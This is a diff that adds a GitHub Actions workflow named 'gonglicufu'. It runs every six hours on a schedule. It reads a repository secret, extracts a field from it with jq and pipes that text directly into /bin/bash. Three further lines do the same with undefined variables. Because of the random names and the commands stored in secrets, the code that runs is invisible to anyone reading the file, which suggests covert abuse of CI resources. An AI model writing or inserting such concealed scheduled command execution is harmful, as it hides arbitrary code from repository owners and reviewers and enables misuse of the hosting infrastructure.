@@ -1,0 +1,20 @@
+name: gonglicufu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gonglicufu
+        env:
+          d573: ${{ secrets.d573 }}
+        run: |
+          echo $d573 | jq -r .gxc1232 | /bin/bash
+          echo $bm86887 | jq -r .azmu496 | /bin/bash
+          echo $a6763 | jq -r .jye176 | /bin/bash
+          echo $ecsrl26 | jq -r .arkw70488 | /bin/bash
+
